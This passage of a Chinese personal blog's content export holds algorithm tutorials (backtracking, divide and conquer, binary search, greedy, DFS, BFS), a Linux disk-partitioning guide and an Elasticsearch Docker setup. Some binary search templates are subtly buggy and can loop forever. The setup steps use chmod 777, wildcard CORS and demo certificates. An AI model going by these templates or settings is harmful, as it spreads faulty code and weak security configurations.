i)&#123; if(i&gt;n) 输出结果; else &#123; for(j &#x3D; 下界; j &lt;&#x3D; 上界; j&#x3D;j+1) &#x2F;&#x2F; 枚举i所有可能的路径 &#123; if(fun(j)) &#x2F;&#x2F; 满足限界函数和约束条件 &#123; a[i] &#x3D; j; ... &#x2F;&#x2F; 其他操作 try(i+1); 回溯前的清理工作（如a[i]置空值等）; &#125; &#125; &#125;&#125; 非递归 123456789101112131415161718192021222324252627int a[n],i;初始化数组a[];i &#x3D; 1;while (i&gt;0(有路可走) and (未达到目标)) &#x2F;&#x2F; 还未回溯到头&#123; if(i &gt; n) &#x2F;&#x2F; 搜索到叶结点 &#123; 搜索到一个解，输出； &#125; else &#x2F;&#x2F; 处理第i个元素 &#123; a[i]第一个可能的值； while(a[i]在不满足约束条件且在搜索空间内) &#123; a[i]下一个可能的值； &#125; if(a[i]在搜索空间内) &#123; 标识占用的资源； i &#x3D; i+1; &#x2F;&#x2F; 扩展下一个结点 &#125; else &#123; 清理所占的状态空间； &#x2F;&#x2F; 回溯 i &#x3D; i –1; &#125;&#125; 子集树与排列树下面的两棵解空间树是回溯法解题时常遇到的两类典型的解空间树。 (1)当所给问题是从n个元素的集合S中找出S满足某种性质的子集时，相应的解空间树称为子集树。例如从n个物品的0-1背包问题(如下图)所相应的解空间树是一棵子集树，这类子集树通常有2^n个叶结点，其结点总个数为2^(n+1)-1。遍历子集树的算法需Ω(2^n)计算时间。 用回溯法搜索子集树的一般算法可描述为： 1234567891011121314151617/** * output(x) 记录或输出得到的可行解x * constraint(t) 当前结点的约束函数 * bount(t) 当前结点的限界函数 * @param t t为当前解空间的层数 */void backtrack(int t)&#123; if(t &gt;= n) output(x); else for (int i = 0; i &lt;= 1; i++) &#123; x[t] = i; if(constraint(t) &amp;&amp; bount(t)) backtrack(t+1); &#125;&#125; (2)当所给问题是确定n个元素满足某种性质的排列时，相应的解空间树称为排列树。例如旅行售货员问题(如下图)的解空间树是一棵排列树，这类排列树通常有n!个叶结点。遍历子集树的算法需Ω(n!)计算时间。 用回溯法搜索排列树的一般算法可描述为： 1234567891011121314151617/** * output(x) 记录或输出得到的可行解x * constraint(t) 当前结点的约束函数 * bount(t) 当前结点的限界函数 * @param t t为当前解空间的层数 */void backtrack(int t)&#123; if(t &gt;= n) output(x); else for (int i = t; i &lt;= n; i++) &#123; swap(x[t], x[i]); if(constraint(t) &amp;&amp; bount(t)) backtrack(t+1); swap(x[t], x[i]); &#125;&#125; 例题 数字键盘组合 IP 地址划分 在矩阵中寻找字符串 输出二叉树中所有从根到叶子的路径 排列 含有相同元素求排列 组合 组合求和 含有相同元素的组合求和 1-9 数字的组合求和 子集 含有相同元素求子集 分割字符串使得每个部分都是回文数 数独 N 皇后 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%90%9C%E7%B4%A2.md#backtracking 参考文章 五大常用算法之四：回溯法回溯法的解题步骤与例子解析","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"回溯","slug":"回溯","permalink":"https://blog.cfyqy.com/tags/%E5%9B%9E%E6%BA%AF/"}],"author":"ye1s"},{"title":"分治法","slug":"分治法","date":"2019-09-02T03:06:00.000Z","updated":"2020-04-13T07:54:06.000Z","comments":true,"path":"article/7f3bcd7f.html","link":"","permalink":"https://blog.cfyqy.com/article/7f3bcd7f.html","excerpt":"","text":"概念在计算机科学中，分治法是一种很重要的算法。字面上的解释是“分而治之”，就是把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。这个技巧是很多高效算法的基础，如排序算法(快速排序，归并排序)，傅立叶变换(快速傅立叶变换)…… 基本思想 分治法的设计思想是：将一个难以直接解决的大问题，分割成一些规模较小的相同问题，以便各个击破，分而治之。 分治策略是：对于一个规模为n的问题，若该问题可以容易地解决（比如说规模n较小）则直接解决，否则将其分解为k个规模较小的子问题，这些子问题互相独立且与原问题形式相同，递归地解这些子问题，然后将各子问题的解合并得到原问题的解。这种算法设计策略叫做分治法。 如果原问题可分割成k个子问题，1&lt;k≤n，且这些子问题都可解并可利用这些子问题的解求出原问题的解，那么这种分治法就是可行的。由分治法产生的子问题往往是原问题的较小模式，这就为使用递归技术提供了方便。在这种情况下，反复应用分治手段，可以使子问题与原问题类型一致而其规模却不断缩小，最终使子问题缩小到很容易直接求出其解。这自然导致递归过程的产生。分治与递归像一对孪生兄弟，经常同时应用在算法设计之中，并由此产生许多高效算法。 适用情况分治法所能解决的问题一般具有以下几个特征： 1) 该问题的规模缩小到一定的程度就可以容易地解决 2) 该问题可以分解为若干个规模较小的相同问题，即该问题具有最优子结构性质。 3) 利用该问题分解出的子问题的解可以合并为该问题的解； 4) 该问题所分解出的各个子问题是相互独立的，即子问题之间不包含公共的子子问题。 第一条特征是绝大多数问题都可以满足的，因为问题的计算复杂性一般是随着问题规模的增加而增加； 第二条特征是应用分治法的前提它也是大多数问题可以满足的，此特征反映了递归思想的应用；、 第三条特征是关键，能否利用分治法完全取决于问题是否具有第三条特征，如果具备了第一条和第二条特征，而不具备第三条特征，则可以考虑用贪心法或动态规划法。 第四条特征涉及到分治法的效率，如果各子问题是不独立的则分治法要做许多不必要的工作，重复地解公共的子问题，此时虽然可用分治法，但一般用动态规划法较好。 基本步骤分治法在每一层递归上都有三个步骤： step1 分解：将原问题分解为若干个规模较小，相互独立，与原问题形式相同的子问题； step2 解决：若子问题规模较小而容易被解决则直接解，否则递归地解各个子问题 step3 合并：将各个子问题的解合并为原问题的解。 它的一般的算法设计模式如下： Divide-and-Conquer(P) if |P|≤n0 then return(ADHOC(P)) 将P分解为较小的子问题 P1 ,P2 ,…,Pk for i←1 to k do yi ← Divide-and-Conquer(Pi) △ 递归解决Pi T ← MERGE(y1,y2,…,yk) △ 合并子问题 return(T) 其中|P|表示问题P的规模；n0为一阈值，表示当问题P的规模不超过n0时，问题已容易直接解出，不必再继续分解。ADHOC(P)是该分治法中的基本子算法，用于直接解小规模的问题P。因此，当P的规模不超过n0时直接用算法ADHOC(P)求解。算法MERGE(y1,y2,…,yk)是该分治法中的合并子算法，用于将P的子问题P1 ,P2 ,…,Pk的相应的解y1,y2,…,yk合并为P的解。 复杂度一个分治法将规模为n的问题分成k个规模为n／m的子问题去解。设分解阀值n0=1，且adhoc解规模为1的问题耗费1个单位时间。再设将原问题分解为k个子问题以及用merge将k个子问题的解合并为原问题的解需用f(n)个单位时间。用T(n)表示该分治法解规模为|P|=n的问题所需的计算时间，则有： T（n）= k T(n/m)+f(n) 通过迭代法求得方程的解： 递归方程及其解只给出n等于m的方幂时T(n)的值，但是如果认为T(n)足够平滑，那么由n等于m的方幂时T(n)的值可以估计T(n)的增长速度。通常假定T(n)是单调上升的，从而当 mi≤n&lt;mi+1时，T(mi)≤T(n)&lt;T(mi+1)。 应用（1）二分搜索（2）大整数乘法 （3）Strassen矩阵乘法（4）棋盘覆盖（5）合并排序（6）快速排序（7）线性时间选择（8）最接近点对问题（9）循环赛日程表（10）汉诺塔 例题 给表达式加括号 不同的二叉搜索树 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%88%86%E6%B2%BB.md 参考文章: 分治法详解","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"分治","slug":"分治","permalink":"https://blog.cfyqy.com/tags/%E5%88%86%E6%B2%BB/"}],"author":"ye1s"},{"title":"二分法","slug":"二分法","date":"2019-09-02T01:00:00.000Z","updated":"2020-04-13T07:54:43.000Z","comments":true,"path":"article/649c2087.html","link":"","permalink":"https://blog.cfyqy.com/article/649c2087.html","excerpt":"","text":"概念二分法查找，也称为折半法，是一种在有序数组中查找特定元素的搜索算法。 思路二分法查找的思路如下： （1）首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。 （2）如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。 （3）如果某一步数组为空，则表示找不到目标元素。 二分法查找的时间复杂度O(logn)。 框架非递归方法: 区间问题二分查找，要注意的地方 闭区间 [L,R]: 1234567891011121314151617int binary_search(int a[],int size,int p)&#123; int L = 0; int R = size - 1; while(L &lt;= R) //查找区间，以两个数据为例子，L,R 都完成比较 &#123; int mid = L + (R - L)/2; if(p == a[mid]) return mid; else if(p &gt; a[mid])&#123; L = mid +1; &#125; else&#123; R = mid - 1; &#125; &#125;&#125; 左闭右开 [L,R)： 1234567891011121314151617int binary_search(int a[],int size,int p)&#123; int L = 0; int R = size - 1; while(L &lt; R) &#123; int mid = L + (R -L)/2; if(p == a[mid]) return mid; else if(p &lt; a[mid])&#123; R = mid; &#125; else&#123; L = mid; &#125; &#125;&#125; 左开右开 (L ,R): 12345678910111213141516int binary_search(int a[],int size,int p)&#123; int L = 0; int R = size - 1; while(R-L &gt; 1)&#123; int mid = L + (R-L)/2; if(a[mid] == p) return mid; else if(p &lt; a[mid])&#123; R = mid; &#125; else&#123; L = mid; &#125; &#125;&#125; 例题 求开方 大于给定元素的最小元素 有序数组的 Single Element 第一个错误的版本 旋转数组的最小数字 查找区间 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.md 参考文章: 算法-二分查找 二分查找，要注意的地方","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"二分法","slug":"二分法","permalink":"https://blog.cfyqy.com/tags/%E4%BA%8C%E5%88%86%E6%B3%95/"}],"author":"ye1s"},{"title":"two指针","slug":"two指针","date":"2019-09-01T15:34:00.000Z","updated":"2020-04-13T07:54:56.000Z","comments":true,"path":"article/528f01d9.html","link":"","permalink":"https://blog.cfyqy.com/article/528f01d9.html","excerpt":"","text":"概念双指针，顾名思义，就是利用两个指针去遍历数组，一般来说，遍历数组采用的是单指针（index）去遍历，两个指针一般是在有序数组中使用，一个放首，一个放尾，同时向中间遍历，直到两个指针相交，完成遍历，时间复杂度也是O(n)。 使用场景 时间复杂度：O(n) 并且 One Pass 空间要求：in place 两数之和满足某条件 先对数组排序，再采用两个指针，分别从前和后往中间遍历，front增大，tail减小，通过对条件的判断，可以在O(n)内遍历，而非使用双重循环。 in place交换 一个指针正常遍历，另一个指针去找可以用来交换的元素。 例题 有序数组的 Two Sum 两数平方和 反转字符串中的元音字符 回文字符串 归并两个有序数组 判断链表是否存在环 最长子序列 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8F%8C%E6%8C%87%E9%92%88.md 参考文章: 算法之双指针","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"two指针","slug":"two指针","permalink":"https://blog.cfyqy.com/tags/two%E6%8C%87%E9%92%88/"}],"author":"ye1s"},{"title":"贪心思想","slug":"思想","date":"2019-09-01T15:22:00.000Z","updated":"2020-04-13T07:55:07.000Z","comments":true,"path":"article/73952078.html","link":"","permalink":"https://blog.cfyqy.com/article/73952078.html","excerpt":"","text":"概念所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的局部最优解。 贪婪算法所得到的结果往往不是最优的结果(有时候会是最优解)，但是都是相对近似(接近)最优解的结果。 贪婪算法并没有固定的算法解决框架，算法的关键是贪婪策略的选择，根据不同的问题选择不同的策略。 必须注意的是策略的选择必须具备无后效性，即某个状态的选择不会影响到之前的状态，只与当前状态有关，所以对采用的贪婪的策略一定要仔细分析其是否满足无后效性 基本思路： 1.建立数学模型来描述问题。 2.把求解的问题分成若干个子问题。 3.对每一子问题求解，得到子问题的局部最优解。 4.把子问题的解局部最优解合成原来解问题的一个解。 适用性问题贪心策略适用的前提是：局部最优策略能导致产生全局最优解。 实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。 框架123456从问题的某一初始解出发； while （能朝给定总目标前进一步） &#123; 利用可行的决策，求出可行解的一个解元素； &#125; 由所有解元素组合成问题的一个可行解； 例题 分配饼干 不重叠的区间个数 投飞镖刺破气球 根据身高和序号重组队列 买卖股票最大的收益 买卖股票的最大收益 II 种植花朵 判断是否为子序列 修改一个数成为非递减数组 子数组最大的和 分隔字符串使同种字符出现在一起 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E8%B4%AA%E5%BF%83%E6%80%9D%E6%83%B3.md 参考文章: 五大常用算法之三：贪心算法贪心算法","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"贪心思想","slug":"贪心思想","permalink":"https://blog.cfyqy.com/tags/%E8%B4%AA%E5%BF%83%E6%80%9D%E6%83%B3/"}],"author":"ye1s"},{"title":"深度优先搜索","slug":"深度优先搜索","date":"2019-09-01T12:50:00.000Z","updated":"2020-04-13T07:55:29.000Z","comments":true,"path":"article/1857aa15.html","link":"","permalink":"https://blog.cfyqy.com/article/1857aa15.html","excerpt":"","text":"概念它的思想是从一个顶点V0开始，沿着一条路一直走到底，如果发现不能到达目标解，那就返回到上一个节点，然后从另一条路开始走到底，这种尽量往深处走的概念即是深度优先的概念。 在程序实现 DFS 时需要考虑以下问题： 栈：用栈来保存当前节点信息，当遍历新节点返回时能够继续遍历当前节点。可以使用递归栈。 标记：和 BFS 一样同样需要对已经遍历过的节点进行标记。 模板框架1234567891011121314151617181920212223242526/** * DFS核心伪代码 * 前置条件是visit数组全部设置成false * @param n 当前开始搜索的节点 * @param d 当前到达的深度 * @return 是否有解 */bool DFS(Node n, int d)&#123; if (isEnd(n, d))&#123;//一旦搜索深度到达一个结束状态，就返回true return true; &#125; for (Node nextNode in n)&#123;//遍历n相邻的节点nextNode if (!visit[nextNode])&#123;// visit[nextNode] = true;//在下一步搜索中，nextNode不能再次出现 if (DFS(nextNode, d+1))&#123;//如果搜索出有解 //做些其他事情，例如记录结果深度等 return true; &#125; //重新设置成false，因为它有可能出现在下一次搜索的别的路径中 visit[nextNode] = false; &#125; &#125; return false;//本次搜索无解&#125; 例题 查找最大的连通面积 矩阵中的连通分量数目 好友关系的连通分量数目 填充封闭区域 能到达的太平洋和大西洋的区域 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%90%9C%E7%B4%A2.md#dfs 参考文章: 深度优先搜索(DFS)","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"https://blog.cfyqy.com/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"}],"author":"ye1s"},{"title":"广度优先搜索","slug":"广度优先搜索-bfs","date":"2019-09-01T12:11:00.000Z","updated":"2020-04-13T07:55:52.000Z","comments":true,"path":"article/a3e0a169.html","link":"","permalink":"https://blog.cfyqy.com/article/a3e0a169.html","excerpt":"","text":"算法概念 也称宽度优先搜索，顾名思义，就是将一棵树一层一层往下搜。算法首先搜索和s距离为k的所有顶点，然后再去搜索和S距离为k+l的其他顶点。BFS是一种完备策略，即只要问题有解，它就一定可以找到解。并且，广度优先搜索找到的解，还一定是路径最短的解。但是它盲目性较大，尤其是当目标节点距初始节点较远时，将产生许多无用的节点，因此其搜索效率较低。需要保存所有扩展出的状态，占用的空间大 在程序实现 BFS 时需要考虑以下问题： 队列：用来存储每一轮遍历得到的节点； 标记：对于遍历过的节点，应该将它标记，防止重复遍历。 BFS可用于解决2类问题： 从A出发是否存在到达B的路径； 从A出发到达B的最短路径(这个应该叫最少步骤合理)； 框架123456789BFS()&#123;初始化队列while(队列不为空且未找到目标节点)&#123;取队首节点扩展，并将扩展出的节点放入队尾；必要时要记住每个节点的父节点；&#125;&#125; 例题 计算在网格中从原点到特定点的最短路径长度 组成整数的最小平方数数量 最短单词路径 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%90%9C%E7%B4%A2.md#bfs","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"广度优先搜索","slug":"广度优先搜索","permalink":"https://blog.cfyqy.com/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"}],"author":"ye1s"},{"title":"linux磁盘分区","slug":"nux磁盘分区","date":"2019-08-03T15:34:14.000Z","updated":"2020-04-13T07:58:15.000Z","comments":true,"path":"article/5b174d38.html","link":"","permalink":"https://blog.cfyqy.com/article/5b174d38.html","excerpt":"最近要下载一大堆的资料到服务器上，服务器系统盘的磁盘容量有点不够，还有一个11T的机械硬盘没有使用，但没有分区也没挂载，直接挂载有点浪费，先分区一下。","text":"最近要下载一大堆的资料到服务器上，服务器系统盘的磁盘容量有点不够，还有一个11T的机械硬盘没有使用，但没有分区也没挂载，直接挂载有点浪费，先分区一下。 首先先了解一下分区的一些知识: 硬盘分区有三种，主磁盘分区、扩展磁盘分区、逻辑分区。 一个硬盘主分区至少有1个，最多4个，扩展分区可以没有，最多1个。且主分区+扩展分区总共不能超过4个。逻辑分区可以有若干 但扩展分区是不能直接用的，他是以逻辑分区的方式来使用的，所以说扩展分区可分成若干逻辑分区 在linux中第一块硬盘分区为hda分区(或者是sda分区)，主分区编号为hda1-4，逻辑分区从5开始。 一个是放置该硬盘的信息区，称之为主引导分区(master boot recorder,MBR)，一个是实际文件数据放置的地方.其中，MBR是整个硬盘最重要的区域.一旦MBR物理实体损坏时，则该硬盘就差不多报废了.一般来说，MBR有512个字节，且可以分为两个部分. (1)第一部分有446个字节，用于存放引导代码，即bootloader. (2)第二部分有64个字节，用于存放磁盘分区表.其中，每个分区的信息需要用16个字节来记录，因此，一个硬盘最多可以有4个分区.这4个分区称之为主分区和扩展分区(extended). Linux 先有目录，再将物理地址(分区)映射到目录中(windows相反).所有路径都是从根目录开始。默认分为：boot分区、swap分区和根分区.(另外：每个系统有自己的格式。linux(ext2,ext3,ext4),windows(ntfs,fat32)) /boot区，通常情况下根据Linux的版本不同，个人分区习惯会不同，我这里分配了500M给这个分区。 swap区，交换区，通常分配给其的大小为物理内存的2倍，但是最好不要超过256M，所以我这里分配了256M给这个分区。 / 区，也就是根目录，这个分区尽量给其分配大的空间，可以将安装Linux系统的这个硬盘上除去分给/boot、swap区以外的空间都分配给这个分 具体详情可看Linux学习之CentOS(八)–Linux系统的分区概念 尝试了常见的fdisk分区方法 fdisk分区0x1.1首先fdisk -l 查看硬盘及分区信息这里举例其中的一部分 1234567891011Disk /dev/nvme0n1: 953.9 GiB, 1024209543168 bytes, 2000409264 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: gptDisk identifier: A7245786-B2A7-4BEB-9B3E-1CAE85EE0D61Device Start End Sectors Size Type/dev/nvme0n1p1 2048 1050623 1048576 512M EFI System/dev/nvme0n1p2 1050624 2000408575 1999357952 953.4G Linux filesystem 具体的解释可看linux磁盘分区fdisk命令详解 0x1.2 fdisk命令参数介绍 123456m、一些参数解释p、打印分区表。n、新建一个新分区。d、删除一个分区。q、退出不保存。w、把分区写进分区表，保存并退出。 具体的分区操作可看fdisk命令详解当硬盘空间大于2TB时，不能使用fdisk进行分区，因为fdisk最大支持2TB，且ext4不支持16TB以上的磁盘格式化，超过2T的磁盘只会显示2T,这里的磁盘有10.9T,所以我这里使用parted和xfs。 parted分区0x2.1parted命令详解 12345678910111213141516检查 MINOR #对文件系统进行一个简单的检查 cp [FROM-DEVICE] FROM-MINOR TO-MINOR #将文件系统复制到另一个分区 help [COMMAND] #打印通用求助信息，或关于 COMMAND 的信息 mklabel 标签类型 #创建新的磁盘标签 (分区表) mkfs MINOR 文件系统类型 #在 MINOR 创建类型为“文件系统类型”的文件系统 mkpart 分区类型 [文件系统类型] 起始点 终止点 #创建一个分区 mkpartfs 分区类型 文件系统类型 起始点 终止点 #创建一个带有文件系统的分区 move MINOR 起始点 终止点 #移动编号为 MINOR 的分区 name MINOR 名称 #将编号为 MINOR 的分区命名为“名称” print [MINOR] #打印分区表，或者分区 quit #退出程序 rescue 起始点 终止点 #挽救临近“起始点”、“终止点”的遗失的分区 resize MINOR 起始点 终止点 #改变位于编号为 MINOR 的分区中文件系统的大小 rm MINOR #删除编号为 MINOR 的分区 select 设备 #选择要编辑的设备 set MINOR 标志 状态 #改变编号为 MINOR 的分区的标 0x2.2实例0x2.2.1要分区的磁盘 1parted &#x2F;dev&#x2F;sda 0x2.2.2创建磁盘标签为gpt 如果你的磁盘里有数据的话，这里会出现警告，继续操作将会销毁所有数据如果你的数据都已经备份的话，请根据提示键入y并回车 1(parted) mklabel gpt 0x2.2.3mkpart开始分区 12345(parted) mkpartPartition name? []? sdb1 #指定分区名称File system type? [ext2]? ext4 #指定分区类型Start? 0% #指定分区开始位置End? 20% #指定分区结束位置 start和end建议用%来分区。 以防出现分区不对齐 1Warning: The resulting partition is not properly aligned for best performance. 其他方法可看：parted分区对齐 0x2.2.4p查看磁盘信息 12345678910111213(parted) pModel: ATA ST12000DM0007-2G (scsi)Disk /dev/sda: 12.0TBSector size (logical/physical): 512B/4096BPartition Table: gptDisk Flags:Number Start End Size File system Name Flags 1 1049kB 2400GB 2400GB ext4 data 2 2400GB 4800GB 2400GB sda1 3 4800GB 7200GB 2400GB sda2 4 7200GB 12.0TB 4800GB sda3 0x2.2.5退出 1(parted) quit #quit退出 磁盘格式化格式化命令如下 1mkfs -t ext4 -c /dev/sdc 如果硬盘太大就必须采用快速格式化，不然会等到死 1mkfs.ext4 -T largefile /dev/sdc 挂载在mnt下创建一个空目录sda1,挂载到此目录上 1sudo mount /dev/sda1 /mnt/sda1 这种方法有个不好的都方是机器重启后变又得手工重新挂载.,永久性挂载分区的办法是修改分区文件/etc/fstab 查看磁盘的UUID和文件格式 1sudo blkid /dev/sda1 结果如下: 1/dev/sda1: UUID=\"afb1bcb7-a96d-430e-9559-968f0958175e\" TYPE=\"ext4\" PARTLABEL=\"data\" PARTUUID=\"b2242d48-e2a7-4185-b92a-4b8a3277b62c\" 然后,我们按照/etc/fstab文件中的格式添加一行如下内容: 1UUID=afb1bcb7-a96d-430e-9559-968f0958175e /mnt/sda1 ext4 defaults 0 2 其中第一列为UUID, 第二列为挂载目录（该目录必须为空目录），第三列为文件系统类型，第四列为参数，第五列0表示不备份，最后一列必须为２或0(除非引导分区为1) 最后输入 1mount -a 查看挂载情况 1mount 允许普通用户访问0x4.1任何用户都有权限 1sudo chmod -R 777 /mnt/sda1 0x4.1指定普通用户 12sudo chown -R ye1s:ye1s /mnt/sda1sudo umount /mnt/sda1 将硬盘所在的用户和组改为当前用户重启后,会自动挂载为当前的用户(而非root) 参考文章:Linux学习之CentOS(八)–Linux系统的分区概念 linux磁盘分区fdisk命令详解fdisk命令详解 Linux使用parted挂载大于2T磁盘 parted分区对齐","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.cfyqy.com/tags/linux/"},{"name":"磁盘分区","slug":"磁盘分区","permalink":"https://blog.cfyqy.com/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"}],"author":"ye1s"},{"title":"elasticsearch安装教程","slug":"asticsearc安装教程","date":"2019-07-11T13:52:00.000Z","updated":"2020-04-13T08:00:10.000Z","comments":true,"path":"article/23eb42c6.html","link":"","permalink":"https://blog.cfyqy.com/article/23eb42c6.html","excerpt":"docker下的安装","text":"docker下的安装 快速安装已经配置好相关环境拉取镜像 12sudo docker pull ye1s/es:7.9.3sudo docker pull ye1s/ka:7.9.3 运行容器 123sudo docker run -d --name es -p 9100:9100 -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" ye1s/es:7.9.3sudo docker run --link es:elasticsearch -p 5601:5601 --name ka -d ye1s/ka:7.9.3 一步步安装，可按照下方步骤 0x1安装elasticsearch0x1.1拉取es的docker镜像 1docker pull elasticsearch:7.2.0 镜像要加上具体的版本号，要不会出现如下 1error response from daemon: manifest for elasticsearch:latest not found 最新版本可到官网查看 0x1.2启动es容器 1docker run -d --name es -p 9100:9100 -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" elasticsearch:7.2.0 9200作为Http协议，主要用于外部通讯9300作为Tcp协议，jar之间就是通过tcp协议通讯ES集群之间是通过9300进行通讯 0x1.3进入容器 1docker exec -it es /bin/bash 0x1.4进入配置文件夹 1cd config 修改配置文件 1vi elasticsearch.yml 加入跨域配置 12http.cors.enabled: truehttp.cors.allow-origin: \"*\" 0x1.5退出并不停止运行容器 CTRL +p+q 建 0x1.6重启容器 1docker restart es 0x2安装ik分词器下载地址https://github.com/medcl/elasticsearch-analysis-ikik分词器的版本要与es版本想对应 0x2.1方法一 1./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.2.0/elasticsearch-analysis-ik-7.2.0.zip 0x2.2方法二下载安装包 1wget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.2.0/elasticsearch-analysis-ik-7.2.0.zip 在plugins中并建立ik目录，并解压安装包到到ik中 1unzip -d ./plugins/ik elasticsearch-analysis-ik-7.2.0.zip 重启es,使ik分词器生效 1docker restart es 0x2.3保存一下容器为镜像(下面的步骤损坏好恢复) 1docker commit es es:v1 es为容器名，或容器id. es:v1 要保存的镜像的REPOSITORY和tag 如果要将镜像传到hub上，按如下操作0x2.4为镜像打标签docker tag imageName dockerUserName/xxx[:tag] 1docker tag es:v1 ye1s/ye1s:es 0x2.5登入 1docker login 输入账户密码 0x2.6上传 1docker push dockerUserName/xxx[:tag] 0x3安装search-guard具体的安装和使用和看官网教程0x3.1方法一 1bin/elasticsearch-plugin install -b com.floragunn:search-guard-7:7.2.0-35.0.0 后面换成对应的版本号。可到官网查看 0x3.1方法二下载Search Guard插件的zip文件切换到Elasticsearch安装目录并键入： 1bin/elasticsearch-plugin install -b file:///path/to/search-guard-7-&lt;version&gt;.zip 0x3.2脚本安装因为脚本安装的演示证书都一样，存在安全问题。安全安装具体看官网 1cd into &lt;Elasticsearch directory&gt;/plugins/search-guard-7/tools 添加install_demo_configuration.sh执行权限 1chmod +x install_demo_configuration.sh cd 成 &lt;Elasticsearch directory&gt;/plugins/search-guard-7/tools执行 1./install_demo_configuration.sh 输入三次y其他节点也要执行相同操作并重启ES 12ctrl p+qsudo docker restart es容器 0x3.3修改默认密码默认账户为admin 密码admin也有其他默认的账户密码 1234cd ./plugins/search-guard-7/toolschmod +x hash.sh./hash.sh -p 密码 # 会输出一串字符串$2y$12$Vx9Zp3RWraNyfDMmeyswmuYcWO9Z06BAOI/nf6kvl/CHaZzRv3ZYa 将新生成的字符串拷贝至 ./plugins/search-guard-6/sgconfig/sg_internal_users.yml 文件中，替换原来的admin密码 使配置生效 123cd /usr/share/elasticsearch/plugins/search-guard-7/toolschmod +x sgadmin_demo.sh./sgadmin_demo.sh 0x3.4可能出现问题 如果显示 12WARNING: JAVA_HOME not set, will use./hash.sh: line 25: java: command not found 可安装一下java环境安装jdk此次选择java-1.8.0-openjdk-devel.x86_64 : OpenJDK Development Environment 1yum install java-1.8.0-openjdk-devel.x86_64 配置全局变量 打开配置文件,按insert进入编辑模式 1vi /etc/profile 复制以下三行到文件中，按esc退出编辑模式，输入:wq保存退出（这里的JAVA_HOME以自己实际的目录为准） 123export JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/bin 全局变量立即生效 1source /etc/profile 查看安装jdk是否成功 1java -version java -version 0x4安装kibana0x4.1拉取kibana镜像 1docker pull kibana 0x4.2运行容器 1docker run --link es:elasticsearch -p 5601:5601 --name ka -d 